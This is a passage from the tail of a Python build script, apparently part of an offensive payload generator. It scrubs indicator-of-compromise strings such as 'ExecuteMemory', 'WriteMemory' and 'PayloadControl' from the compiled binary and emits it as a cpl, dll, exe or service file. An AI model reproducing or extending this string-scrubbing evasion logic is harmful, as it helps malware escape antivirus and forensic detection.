	ioc_replace(f'tmp/build/{projectname}.{args.format}', 'DllUnregisterServer')
	ioc_replace(f'tmp/build/{projectname}.{args.format}', 'ExecuteMemory')
	ioc_replace(f'tmp/build/{projectname}.{args.format}', 'PayloadControl')
	ioc_replace(f'tmp/build/{projectname}.{args.format}', 'ProcessCreate')
	ioc_replace(f'tmp/build/{projectname}.{args.format}', 'ProcessOpen')
	ioc_replace(f'tmp/build/{projectname}.{args.format}', 'ProtectMemory')
	ioc_replace(f'tmp/build/{projectname}.{args.format}', 'WriteMemory')
	ioc_replace(f'tmp/build/{projectname}.{args.format}', 'test')

	if args.format == 'cpl':
		outformat = "cpl"
	if args.format == 'dll':
		outformat = "dll"
	if args.format == 'exe':
		outformat = "exe"
	if args.format == 'service':
		outformat = "exe"
	analyze_pe_file(f"tmp/build/{projectname}.{outformat}")
	if args.output:
		tmp_move2(args)
	print("")
	if args.save_config:
		save_config(args.save_config, args)

if __name__ == "__main__":
	main()
